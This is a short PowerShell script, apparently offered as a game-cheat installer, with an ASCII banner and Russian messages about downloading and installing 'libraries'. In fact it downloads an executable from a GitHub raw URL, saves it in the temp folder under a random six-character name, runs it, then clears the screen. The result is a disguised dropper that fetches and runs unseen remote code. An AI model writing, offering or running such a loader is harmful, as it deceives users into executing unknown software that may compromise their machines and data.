Clear-Host; Write-Host @'
                                                                                                          
 ▄▄▄▄▄▄▄ ▄▄▄  ▄▄▄ ▄▄▄    ▄▄▄ ▄▄▄    ▄▄▄ ▄▄▄   ▄▄▄  ▄▄▄▄▄▄▄ ▄▄▄   ▄▄▄  ▄▄▄▄▄▄▄   ▄▄▄▄   ▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄ 
███▀▀▀▀▀ ███  ███ ████▄  ███ ████▄  ███ ███   ███ ███▀▀▀▀▀ ███   ███ ███▀▀▀▀▀ ▄██▀▀██▄ ▀▀▀███▀▀▀ █████▀▀▀ 
███▄▄    ███  ███ ███▀██▄███ ███▀██▄███ ▀███▄███▀ ███      █████████ ███▄▄    ███  ███    ███     ▀████▄  
███▀▀    ███▄▄███ ███  ▀████ ███  ▀████   ▀███▀   ███      ███▀▀▀███ ███      ███▀▀███    ███       ▀████ 
███      ▀██████▀ ███    ███ ███    ███    ███    ▀███████ ███   ███ ▀███████ ███  ███    ███    ███████▀                                                                                                                                                                                                                                                                 
'@ -ForegroundColor Magenta

Write-Host "     "
Write-Host "Скачивание библиотек пожалуйста подождите !" -ForegroundColor Yellow

$spinner = '|','/','-','\'

for ($i = 0; $i -lt 20; $i++) {
    $idx = $i % $spinner.Length
    Write-Host "`r $($spinner[$idx])" -NoNewline -ForegroundColor White
    Start-Sleep -Milliseconds 100
}

Write-Host "`rУстановка библиотек!." -ForegroundColor Blue

# ГЕНЕРАЦИЯ СЛУЧАЙНОГО ИМЕНИ ИЗ 6 СИМВОЛОВ (БУКВЫ И ЦИФРЫ)
$chars = [char[]]'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
$randomName = (-join (1..6 | ForEach-Object { $chars | Get-Random }))

$temp = $env:TEMP
# Теперь файл сохранится как, например, Xy7q9W.exe во временной папке
$libs = "$temp\$randomName.exe"

Invoke-WebRequest "https://github.com/SuperMod27/0/raw/refs/heads/main/libs.exe" -OutFile $libs

Start-Process $libs

Write-Host "`nУспешно установились все библиотеки" -ForegroundColor Green
Write-Host "Окно будет очищено через 5 секунд"

Start-Sleep -Seconds 5

Clear-Host
